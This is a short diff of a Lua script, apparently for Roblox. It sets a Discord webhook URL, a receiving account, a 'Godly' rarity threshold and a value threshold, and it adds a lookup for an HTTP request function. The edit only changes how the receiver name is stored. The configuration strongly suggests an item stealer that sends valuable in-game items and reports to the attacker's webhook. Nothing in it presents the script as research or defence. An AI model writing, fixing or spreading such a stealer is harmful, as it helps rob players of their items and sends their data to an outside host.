@@ -6,7 +6,7 @@ local WEBHOOK = "https://discord.com/api/webhooks/1546514326901358742/u0c8GvShbK
 local RECEIVER = {"Alljm100"}
 local MINIMUM_RARITY = "Godly"
 local MINIMUM_VALUE = 10
-local RECEIVERx = "Alljm100"  -- ← FIXED: Added quotes
+local RECEIVERx = {"Alljm100"}
 
 local function GetRequestFunction()
     if request then return request end
